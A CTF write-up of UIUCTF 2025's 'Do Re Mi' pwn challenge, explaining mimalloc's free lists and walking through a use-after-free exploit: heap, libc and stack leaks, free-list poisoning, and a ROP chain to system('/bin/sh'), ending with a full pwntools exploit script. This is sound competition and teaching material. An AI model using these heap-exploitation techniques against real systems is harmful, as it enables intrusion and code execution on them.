# UIUCTF 2025 Writeup (Pwn/"Do Re Mi")


Over the weekend, I played **UIUCTF** with some friends, and it turned out to be a really enjoyable experience.

The **pwn challenges** were the highlight for me — they were challenging enough to make me think hard, but also rewarding once I pieced things together.

In this writeup, I’ll go through the `do re mi` challenge step by step and explain how I solved it.

Before jumping into the exploit, let’s first get a feel for the **source code** that drives the challenge.

## Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <stdbool.h>

void create();
void update();
void delete();
void look();
unsigned int get_index();

#define NOTE_COUNT 16
#define NOTE_SIZE  128

char * notes [NOTE_COUNT] = {0};

#define INTRO "\
###################################\n\
# Yet Another Heap Note Challenge #\n\
###################################\n\
    What Would You Like to Do:     \n\
        1. Create a Note           \n\
        2. Delete a Note           \n\
        3. Read a Note             \n\
        4. Update a Note           \n\
        5. Exit                    \n"
#define PMT "YAHNC> "

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    printf(INTRO);

    while (true) {
        unsigned int option;
        printf(PMT);
        if (scanf(" %u", &option) != 1){
            printf("Invalid Input.\n");
            exit(1);
        }
        if (option >= 6 || option == 0) {
            printf("Invalid Range.\n");
            exit(1);
        }

        switch(option) {
            case 1: 
                create();
                break;
            case 2: 
                delete();
                break;
            case 3:
                look();
                break;
            case 4:
                update();
                break;
            case 5:
                exit(0);
        }
    }
    return 0;
}

unsigned int get_index() {
    unsigned int number;
    printf("Position? (0-15): ");
    if (scanf(" %u", &number) != 1){
        printf("Invalid Input.\n");
        exit(1);
    }
    if (number >= 16) {
        printf("Invalid Range.\n");
        exit(1);
    }
    return number;
}

void create() {
    unsigned int number = get_index();
    notes[number] = malloc(128);
    printf("Done!\n");
    return;
}

void look() {
    unsigned int number = get_index();
    write(STDOUT_FILENO, notes[number], NOTE_SIZE-1);
    printf("\n");
    printf("Done!\n");
}

void delete() {
   unsigned int number = get_index();
   free(notes[number]);
   printf("Done!\n");
   return; 
}

void update() {
    unsigned int number = get_index();
    printf("Content? (127 max): ");
    read(STDIN_FILENO, notes[number], NOTE_SIZE-1);
    printf("Done!\n");
    return;
}
```

from the look of the code it definitely looks like a classic heap notes type pwn challenge

Lets understand it closely

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <stdbool.h>

void create();
void update();
void delete();
void look();
unsigned int get_index();

#define NOTE_COUNT 16
#define NOTE_SIZE  128

char * notes [NOTE_COUNT] = {0};

#define INTRO "\
###################################\n\
# Yet Another Heap Note Challenge #\n\
###################################\n\
    What Would You Like to Do:     \n\
        1. Create a Note           \n\
        2. Delete a Note           \n\
        3. Read a Note             \n\
        4. Update a Note           \n\
        5. Exit                    \n"
#define PMT "YAHNC> "

```

The code above sets up the basic framework for a heap-based note-taking program. It defines four key functions:

- `create()` — used to allocate and create new notes.
- `update()` — likely used to edit or update the content of an existing note.
- `look()` — used to display (or read) the contents of a note.
- `delete()` — used to delete (i.e., free) an allocated note.

There’s a `notes` array defined with a fixed size (`NOTE_COUNT = 16`) where each entry can point to a note of size `NOTE_SIZE = 128`. The interface is menu-driven and offers options for each of the operations listed above.

### Main Function

```c
int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    printf(INTRO);

    while (true) {
        unsigned int option;
        printf(PMT);
        if (scanf(" %u", &option) != 1){
            printf("Invalid Input.\n");
            exit(1);
        }
        if (option >= 6 || option == 0) {
            printf("Invalid Range.\n");
            exit(1);
        }

        switch(option) {
            case 1: 
                create();
                break;
            case 2: 
                delete();
                break;
            case 3:
                look();
                break;
            case 4:
                update();
                break;
            case 5:
                exit(0);
        }
    }
    return 0;
}

unsigned int get_index() {
    unsigned int number;
    printf("Position? (0-15): ");
    if (scanf(" %u", &number) != 1){
        printf("Invalid Input.\n");
        exit(1);
    }
    if (number >= 16) {
        printf("Invalid Range.\n");
        exit(1);
    }
    return number;
}

void create() {
    unsigned int number = get_index();
    notes[number] = malloc(128);
    printf("Done!\n");
    return;
}

void look() {
    unsigned int number = get_index();
    write(STDOUT_FILENO, notes[number], NOTE_SIZE-1);
    printf("\n");
    printf("Done!\n");
}

void delete() {
   unsigned int number = get_index();
   free(notes[number]);
   printf("Done!\n");
   return; 
}

void update() {
    unsigned int number = get_index();
    printf("Content? (127 max): ");
    read(STDIN_FILENO, notes[number], NOTE_SIZE-1);
    printf("Done!\n");
    return;
}
```

The `main()` function does a few important things up front:

- It disables buffering for `stdin`, `stdout`, and `stderr` using `setvbuf()`, which is pretty common in CTF challenges to make input/output immediate and predictable.
- Then, it prints the menu and enters an infinite loop, waiting for the user to choose one of the options.

Valid options are 1 through 5. Any invalid input or out-of-range value results in the program exiting immediately.

The available operations are:

---

### Case 1: `create()`

This function:

- Prompts the user for an index between 0 and 15 (through `get_index()`).
- Allocates a chunk of 128 bytes and stores its pointer in the `notes[]` array at that index.

> No check is done to see if a note already exists at that index.This means we **can call `create()` multiple times at the same index**, creating infinte notes.
> 

---

### Case 2: `look()`

- Takes an index (0–15) and prints the content of the note at that index using `write()` (not `printf`), up to `NOTE_SIZE - 1` bytes (i.e., 127 bytes).
- It can potentionally be used to leak addresses.

---

### Case 3: `delete()`

- Frees the memory allocated at the specified index in the `notes[]` array.
    
    > **Bad Programming alert:** It doesn’t check if the chunk has already been freed, and it also doesn’t null out the pointer in the `notes` array. So yeah — **Use-After-Free is definitely possible**.
    > 

---

### Case 4: `update()`

- Writes up to 127 bytes into the chunk pointed to by `notes[index]` using `read()`.
    
    > It doesn’t check if the pointer is valid or already freed.Combined with the `delete()` bug,
    > 
    > 
    > this gives us a clean **UAF** — just free a chunk and still write to it with `update()` .
    > 

---

The source code is full of bugs and just straight-up bad practices.

Honestly, after reading through it, I was like — *“Huuuh… this is a 10-minute solve, easy.”*

But then out of curiosity, I checked the scoreboard to see how many people had solved it in the past 6 hours... and it showed **only 2 solves**.

*WTH?! Only 2 solves after 6 hours?*

<img src="/d1ff/doremi/Source_Code.png" width="300" style="display: block; margin: auto;" />
<!-- ![source_Code.png](/d1ff/doremi/source_Code.png) -->

Then I noticed one of the files was `libmimalloc.so.2.2` — and that’s when it clicked.

The challenge had a twist: it was using **mimalloc**, not the usual glibc heap. So yeah, we had something different to deal with.

### Other challenge Info

![image.png](/d1ff/doremi/4d75ca57-fc1c-4674-929c-bd10da0610ec.png)

all `green` 🥲.

***file info*** :

chal:  `ELF 64-bit LSB pie executable`, x86-64, version 1 (SYSV), dynamically linked, interpreter `/lib/ld-musl-x86_64.so.1` ,BuildID[sha1]=d03b8a1569c45ed78a067b229eada20c723aec72, with debug_info, not stripped

> The `chal` is using `/lib/ld-musl-x86_64.so.1` as the main library for the process but uses `libmimalloc.so.2.2` as a replacement for memory related functions.
> 

---

## Mimalloc

`mimalloc` (short for *"Microsoft malloc"*) is a **high-performance memory allocator** developed by Microsoft. It's designed to be fast, scalable, and memory-efficient, and it can be used as a drop-in replacement for the standard `malloc`, `free` and other memory related functions.

### Setup/Linking

The chal file was not running in my local machine at first. To setup and link the libraries provided, do the following :-

1. `sudo apt install musl` 
2. Obtain the `ld-musl-x86_64.so.1` from the `Dockerfile` provided and patch the chal file with the library using `pwninit or patchelf` .
3. dynamically override the default allocator using 

```bash
LD_PRELOAD=./libmimalloc.so.2.2 chal_patched
```

Now, once you run the `chal` binary (with `libmimalloc.so` loaded), the **virtual memory layout** should look something like this:

![image.png](/d1ff/doremi/image.png)

### But How does Mimalloc make Allocations?

When `malloc` is called in the code, the mimalloc implementation takes over instead of the standard `malloc`. Instead of using local Heap, Mimalloc creates a memory segment of roughly 4 MiB using `mmap`. Each segment is then split into multiple *mimalloc pages*, each around 64 KiB* in size. A key detail is that each page only handles fixed-size blocks (chunks) — for example, one page might only allocate 16-byte chunks, while another is dedicated to 32-byte chunks. It improves spatial locality of allocations hence increasing it’s performance.

The metadata for both segments and pages is stored right at the beginning of their respective memory regions, holding various pointers and information necessary for allocation, freeing, and internal working. One of the more interesting features of mimalloc is its [**`free list sharding`**](https://www.microsoft.com/en-us/research/wp-content/uploads/2019/06/mimalloc-tr-v1.pdf) — breaking up free lists into different smaller lists which improves performance by reducing contention and cache-line conflicts when managing free memory blocks.

### Free list sharding

Free list sharding is the core trick that makes **mimalloc** so fast. Instead of one big free list per size class, each page in mimalloc (usually 64 KiB) keeps its **own set of three free lists**. This keeps allocations local to a page, improves cache performance, and avoids multi-thread contention.

1. **The Allocation Free List (`page->free`)**
    - **Purpose:** This is the main list that `malloc` pulls from. When your program requests memory, mimalloc just pops a block from this list. Think of it as the “ready-to-go” stash of chunks.
2. **The Local Free List (`page->local_free`)**
    - **Purpose:** When a thread frees a block it allocated itself (a *local free*), the block goes here instead of immediately returning to the allocation list. The idea is that after a fixed number of allocations, mimalloc will swap this list back into the main free list in bulk. This gives it a predictable “heartbeat” to run maintenance tasks like deferred frees, without slowing down the fast path.
3. **The Thread-Free List (`page->thread_free`)**
    - **Purpose:** This handles the tricky case where one thread frees memory that another thread allocated. To avoid contention and expensive locking, the freed block is atomically pushed onto this list. Later, mimalloc collects the whole batch at once and merges it into the main free list.

In short: instead of juggling one global list per size, mimalloc shards its free lists *per page* and splits them into **three roles**. That way, local allocations are fast, remote frees don’t bottleneck, and maintenance is neatly amortized.

![HeapLayout](/d1ff/doremi/heaplayout.png)

                                                        Heap Layout

In our case, the **Allocation Free List** (`page->free`) can hold up to **32 chunks** at a time. That means mimalloc can serve 32 allocations straight from this list without doing anything else.

Here’s the flow:

- If you free a block of a given size (say, 128 bytes) and then immediately request another 128-byte block, mimalloc will just hand it back to you from the **allocation free list** — as long as it’s not empty.
- Once this list becomes empty , mimalloc switches to the **slow path** (`malloc_generic`). This slow path first transfers any blocks waiting in the **Local Free List** into the Allocation Free List, and then continues serving allocations from there.

---

## Getting Leaks

Getting a (mimalloc)**heap leak**  is pretty straightforward. Since mimalloc stores its free list as a linked list (with the next pointer placed right at the start of each freed chunk) `similar to glibc`, reading the freed chunk will leak a **heap address** directly.

```python
######################### heap leak ##########################
create(0)
edit(0,b'a'*100)
create(1)
free(0)
free(1)
look(1)

heap_leak = unpack(r.recv(6),'all')  
print(hex(heap_leak))
```

For a **libc leak**, we can use a technique similar to **tcache poisoning**. Mimalloc, just like tcache, keeps the linked list pointer at the start of every freed chunk. With a use-after-free bug, we can overwrite that pointer. 

At this point, we only have a **heap leak**, so the next move is to craft a **fake chunk** somewhere inside the mimalloc memory segment or pages itself. Remember, every mimalloc segment also contains a region reserved for **metadata**, which is read-write accessible.This metadata doesn’t just store allocator info — it also contains some **libc pointers**.

```python
################## leak libc address ###############################
edit(1,pack(heap_leak+0x5980a000160+6*8-0x5980a010080)) #overwriting the next pointer of local free list
 for i in range(31): #allocating 31 chunks
    create(2)
create(3) #fake chunk allocated on free list
look(3)
r.recv(6*8)
libc.address = unpack(r.recv(6),'all')-0x00007caf37884100+0x7caf3788c000
print(hex(libc.address))
```

To set things up for later exploitation, I allocated a chunk that sits directly on the free lists. Close to it in memory, there’s also a libc pointer. So by reading this chunk, we get two wins at once: a **libc leak** and **control of the free lists** (the Allocation Free List and the Local Free List).

![mod_mi-pica.png](/d1ff/doremi/1f52789d-8511-4251-9ba1-3639b4ed4b8d.png)

---

## Exploitation

So far, we’ve got both a **libc leak** and a **mimalloc heap leak**. On top of that, we managed to allocate a chunk right on the free list itself, which gives us **direct control over future allocations**. From here, there are multiple ways to spawn a shell on remote. The approach I used was to **write a ROP chain onto the stack**, so that when the `update` function returns, execution jumps straight into the ropchain.

To pull this off, we first need a **stack pointer**. Libc provides one in `environ`, which always points to the current stack. By rewriting the Allocation Free List pointer to the address of `libc.environ`, the next allocation will hand us a chunk at that location. From there, we can simply read it to leak the **stack address**. 

```python
################################# stack leak #########
libc_environ = libc.address + 0x7da0fe9c6d60 - 0x7da0fe922000
edit(3,pack(libc_environ))
create(4)
look(4)
stack_leak = unpack(r.recv(6),'all')
print(hex(stack_leak)) 
######################################################
```

From the challenge’s Docker instance, we can figure out the exact offset between the leaked stack address from `environ` and the return address of the `update` function. That offset turns out to be **-0x70 bytes**.

ow we just point the **Allocation Free List head** to the exact stack address we want (the return address of `update`). Then, by creating a new chunk, we can write our **ROP chain** directly onto the stack. When the `update` function finally returns, execution jumps straight into our chain — and we pop a shell. **Boom!** 

```python
###################### rop_chain ######################
ROP = ROP(libc)
rdi = libc.address + 0x0000000000014413
ret = libc.address + 0x0000000000014126
system = libc.address + 0x00000000000501b0
payload = pack(rdi) + pack(next(libc.search('/bin/sh\0'))) + pack(ret) + pack(libc.sym.system)
ret_addr = stack_leak-0x70
edit(3,pack(ret_addr))
create(5)
edit(5,payload)
r.interactive()
```

**Complete Exploitation Script**

```python
from pwn import *
elf = context.binary = ELF('./chal_patched')
libc = ELF('./ld-musl-x86_64.so.1')
global r
env = {
    'LD_PRELOAD': './libmimalloc.so.2.2'
}
r = process('./chal_patched',env=env)
gdb.attach(r,gdbscript='b *update')
# r = remote('doremi.chal.uiuc.tf', 1337, ssl=True)
def create(index):
    r.sendlineafter(b'YAHNC> ',b'1')
    r.sendlineafter(b'Position? (0-15): ',str(index).encode())

def look(index):
    r.sendlineafter(b'YAHNC> ',b'3')
    r.sendlineafter(b'Position? (0-15): ',str(index).encode())  

def free(index):
    r.sendlineafter(b'YAHNC> ',b'2')
    r.sendlineafter(b'Position? (0-15): ',str(index).encode())     

def edit(index,content):
    r.sendlineafter(b'YAHNC> ',b'4')
    r.sendlineafter(b'Position? (0-15): ',str(index).encode())
    r.sendlineafter(b'Content? (127 max): ',content)

######################### heap leak ##########################
create(0)
edit(0,b'a'*100)
create(1)
free(0)
free(1)
look(1)

heap_leak = unpack(r.recv(6),'all')  
print(hex(heap_leak))

################## leak libc address ###############################
edit(1,pack(heap_leak+0x5980a000160+6*8-0x5980a010080)) #overwriting the next pointer of local free list
 for i in range(31): #allocating 31 chunks
    create(2)
create(3) #fake chunk allocated on free list
look(3)
r.recv(6*8)
libc.address = unpack(r.recv(6),'all')-0x00007caf37884100+0x7caf3788c000
print(hex(libc.address))

################################# stack leak #########
libc_environ = libc.address + 0x7da0fe9c6d60 - 0x7da0fe922000
edit(3,pack(libc_environ))
create(4)
look(4)
stack_leak = unpack(r.recv(6),'all')
print(hex(stack_leak)) 
######################################################

###################### rop_chain ######################
ROP = ROP(libc)
rdi = libc.address + 0x0000000000014413
ret = libc.address + 0x0000000000014126
system = libc.address + 0x00000000000501b0
payload = pack(rdi) + pack(next(libc.search('/bin/sh\0'))) + pack(ret) + pack(libc.sym.system)
ret_addr = stack_leak-0x70
edit(3,pack(ret_addr))
create(5)
edit(5,payload)
r.interactive()
```

---

## ♘Summary

- Mimalloc allocates memory in 4 MiB segments split into 64 KiB pages, each page managing fixed-size chunks with three free lists (allocation, local, thread).
- A heap leak is obtained by freeing a chunk and reading it back (since freed pointers aren’t nulled), revealing a heap address.
- Allocations are always served from the **allocation free list** first. Once this list is empty, the allocator calls the **slow path (`malloc_generic`)**, which pulls chunks from the **local free list** (by merging it back).
- Using UAF, we overwrite free list pointers (like tcache poisoning) and allocate a fake chunk inside the metadata region, which also holds libc pointers. Reading it gives both a libc leak and control over the free lists.
- To pivot to the stack, we redirect the allocation free list to `libc.environ`, leak the stack pointer.
- Finally, we set the allocation free list head to the return address, allocate a chunk, write our ROP chain there, and when `update` returns, execution jumps into our chain → shell.

![image.png](/d1ff/doremi/9444d9a9-7884-4519-a379-604e25d152cc.png)

---

## Resources & References

[https://2025.uiuc.tf/](https://2025.uiuc.tf/) , [https://sigpwny.com/](https://sigpwny.com/)

- [https://microsoft.github.io/mimalloc/](https://microsoft.github.io/mimalloc/)
- [https://www.microsoft.com/en-us/research/wp-content/uploads/2019/06/mimalloc-tr-v1.pdf](https://www.microsoft.com/en-us/research/wp-content/uploads/2019/06/mimalloc-tr-v1.pdf)
- `for setup` → [https://ctftime.org/writeup/28214](https://ctftime.org/writeup/28214)

---

> Author: [_d1ff](https://discord.com/users/1157208253055381504)  
> URL: http://localhost:1313/d1ff/posts/uiu_writeup/doremi/  

